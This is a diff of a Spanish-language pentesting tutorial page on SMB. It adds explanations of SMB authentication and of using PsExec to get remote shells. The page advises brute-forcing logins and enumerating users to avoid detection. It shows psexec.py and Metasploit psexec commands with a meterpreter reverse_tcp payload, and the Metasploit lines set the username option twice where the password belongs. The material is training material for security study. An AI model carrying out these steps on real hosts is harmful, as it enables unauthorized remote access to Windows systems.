@@ -1,5 +1,16 @@
 # SMB
 
+**SMB (Server Message Block)** es un protocolo de intercambio de archivos y periféricos (impresoras y puertos serie) entre equipos de una red local. Utiliza el puerto 445, sin embargo, originalmente SMB funcionaba sobre NetBIOS utilizando el puerto 139. SAMBA es la implementación de código abierto de SMB para Linux y permite que los sistemas Windows accedan a recursos compartidos y dispositivos de Linux.
+
+El protocolo SMB utiliza dos niveles de autenticación:
+
+- Autenticación de usuario: los usuarios deben proporcionar un nombre de usuario y una contraseña para autenticarse ante el servidor SMB y poder acceder a un recurso compartido.
+- Autenticación de recurso compartido: los usuarios deben proporcionar una contraseña para acceder a un recurso compartido restringido.
+
+Ambos niveles de autenticación utilizan un sistema de autenticación de desafío-respuesta (challenge-response).
+
+![auth_smb](../../../img/auth_smb.png)
+
 ### Identificación de usuarios
 
 Es recomendable enumerar los usuarios antes de realizar un ataque de fuerza bruta para obtener contraseñas. Esto se debe a que al reducir la lista de usuarios, reducimos el tiempo del ataque y la probabilidad de detección.
@@ -73,7 +84,15 @@ Para automatizar esta tarea podemos usar el scritp `smbfuzz` disponible [aquí](
 
 ### Ejecución remota de comandos con `PsExec`
 
-sExec es una herramienta que permite ejecutar procesos de forma remota en sistemas Windows a través de SMB. Funciona autenticándose en la máquina objetivo con credenciales válidas, copiando y ejecutando un servicio temporal que lanza el proceso solicitado (por ejemplo, cmd.exe) y redirige su entrada y salida al equipo atacante.
+**PsExec** es una herramienta desarrollada por Microsoft como sustituto de Telnet. Permite ejecutar procesos en sistemas Windows remotos utilizando las credenciales de cualquier usuario, realizando la autenticación a través de SMB. Podemos usarlo para autenticarnos legítimamente en el sistema objetivo y ejecutar comandos arbitrarios o abrir una shell remota.
+
+Es similar a RDP, pero en lugar de controlar el sistema remoto mediante una interfaz gráfica, los comandos se envían a través de CMD.
+
+Para obtener acceso a un sistema Windows, necesitaremos identificar cuentas de usuario legítimas y sus contraseñas o hashes. Podemos hacerlo con varias herramientas y técnicas; sin embargo, la más común consiste en realizar un ataque de fuerza bruta para iniciar sesión mediante SMB.
+
+Podemos limitar nuestro ataque a cuentas de usuario comunes de Windows, principalmente el usuario administrador, y una vez que hayamos obtenido las credenciales de una cuenta, podemos usarlas para autenticarnos en el sistema con PsExec y ejecutar comandos del sistema u obtener una shell inversa.
+
+**Ejecución de PsExec**
 
 ```bash
 python psexec.py usuario@host
@@ -89,6 +108,7 @@ msf exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tc
 msf exploit(windows/smb/psexec) > set smbuser usuario
 msf exploit(windows/smb/psexec) > set smbuser contraseña
 msf exploit(windows/smb/psexec) > exploit
+meterpreter > 
 ```
 
 [⟵ Anterior](../../05_sistema.md#explotación-windows)
